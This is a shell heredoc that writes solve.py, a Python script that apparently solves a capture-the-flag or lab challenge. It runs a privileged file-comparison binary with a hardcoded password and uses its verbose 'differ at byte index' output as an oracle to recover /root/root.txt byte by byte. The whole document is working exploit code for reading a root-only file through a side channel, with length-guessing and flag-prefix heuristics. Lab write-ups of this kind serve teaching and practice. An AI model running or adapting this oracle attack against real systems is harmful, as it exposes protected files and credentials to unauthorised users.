cat > solve.py << 'EOF'
#!/usr/bin/env python3
import argparse
import re
import subprocess
import sys

BIN_DEFAULT = "/usr/bin/ffidYm"
TARGET_DEFAULT = "/root/root.txt"
PW_DEFAULT = "YaSjelVsyuSm3tanu:("
GUESS_DEFAULT = "/tmp/guess.bin"

COMMON_PREFIXES = [
    b"flag{", b"FLAG{", b"ctf{", b"CTF{", b"root{", b"ROOT{",
    b"HTB{", b"THM{", b"picoCTF{", b"DUCTF{", b"lab{", b"LAB{",
]

DEFAULT_CHARSET = bytes(range(32, 127)) + b"\n"  # printable + newline
FULL_CHARSET = bytes(range(256))

def run_cmp(bin_path, target, guess_path, password):
    p = subprocess.run(
        [bin_path, "--verbose", target, guess_path],
        input=(password + "\n").encode(),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    out = (p.stdout + p.stderr).decode(errors="ignore").splitlines()
    for line in reversed(out):
        line = line.strip()
        if "Files are identical" in line:
            return -1
        m = re.search(r"Files differ at byte index:\s*(\d+)", line)
        if m:
            return int(m.group(1))
    return None

def write_guess(path, data, total_len):
    if len(data) > total_len:
        raise ValueError("data longer than total_len")
    with open(path, "wb") as f:
        f.write(data)
        f.write(b"\x00" * (total_len - len(data)))

def find_length_with_prefixes(bin_path, target, guess_path, password, max_len):
    for prefix in COMMON_PREFIXES:
        for n in range(len(prefix), max_len + 1):
            write_guess(guess_path, prefix, n)
            res = run_cmp(bin_path, target, guess_path, password)
            if res is None:
                continue
            if res == -1 or res > len(prefix) - 1:
                return n, prefix
    return None, None

def find_length_bruteforce(bin_path, target, guess_path, password, max_len, charset):
    for n in range(1, max_len + 1):
        for b in charset:
            write_guess(guess_path, bytes([b]), n)
            res = run_cmp(bin_path, target, guess_path, password)
            if res is None:
                continue
            if res > 0 or res == -1:
                return n, b
    return None, None

def recover(bin_path, target, guess_path, password, total_len, charset, first_byte=None):
    known = bytearray()
    if first_byte is not None:
        known.append(first_byte)

    for i in range(len(known), total_len):
        found = False
        for b in charset:
            guess = known + bytes([b])
            write_guess(guess_path, guess, total_len)
            res = run_cmp(bin_path, target, guess_path, password)
            if res == -1 and i == total_len - 1:
                known.append(b)
                return bytes(known)
            if res is not None and res > i:
                known.append(b)
                found = True
                break
        if not found and charset is not FULL_CHARSET:
            # fallback to full 0-255 for this byte
            for b in FULL_CHARSET:
                guess = known + bytes([b])
                write_guess(guess_path, guess, total_len)
                res = run_cmp(bin_path, target, guess_path, password)
                if res == -1 and i == total_len - 1:
                    known.append(b)
                    return bytes(known)
                if res is not None and res > i:
                    known.append(b)
                    found = True
                    break
        if not found:
            raise RuntimeError(f"byte not found at position {i}")
        print(f"[+] {i+1}/{total_len}: {known.decode(errors='replace')}", file=sys.stderr)
    return bytes(known)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--bin", default=BIN_DEFAULT)
    ap.add_argument("--target", default=TARGET_DEFAULT)
    ap.add_argument("--password", default=PW_DEFAULT)
    ap.add_argument("--guess", default=GUESS_DEFAULT)
    ap.add_argument("--max-len", type=int, default=256)
    ap.add_argument("--len", type=int, default=0, help="known length")
    ap.add_argument("--prefix", default="", help="known prefix, e.g. flag{")
    ap.add_argument("--full-charset", action="store_true")
    args = ap.parse_args()

    charset = FULL_CHARSET if args.full_charset else DEFAULT_CHARSET

    n = args.len if args.len > 0 else None
    prefix = args.prefix.encode() if args.prefix else None
    first_byte = None

    if n is None:
        if prefix:
            for L in range(len(prefix), args.max_len + 1):
                write_guess(args.guess, prefix, L)
                res = run_cmp(args.bin, args.target, args.guess, args.password)
                if res is not None and (res == -1 or res > len(prefix) - 1):
                    n = L
                    first_byte = prefix[0]
                    break
        if n is None:
            n, pref = find_length_with_prefixes(args.bin, args.target, args.guess, args.password, args.max_len)
            if n is not None:
                first_byte = pref[0]
        if n is None:
            n, first_byte = find_length_bruteforce(
                args.bin, args.target, args.guess, args.password, args.max_len, charset
            )
    if n is None:
        print("Length not found. Increase --max-len or use --len/--prefix.", file=sys.stderr)
        sys.exit(1)

    data = recover(args.bin, args.target, args.guess, args.password, n, charset, first_byte=first_byte)
    print(f"[+] length: {n}", file=sys.stderr)
    print(f"[+] hex: {data.hex()}", file=sys.stderr)
    sys.stdout.buffer.write(data + b"\n")

if __name__ == "__main__":
    main()
EOF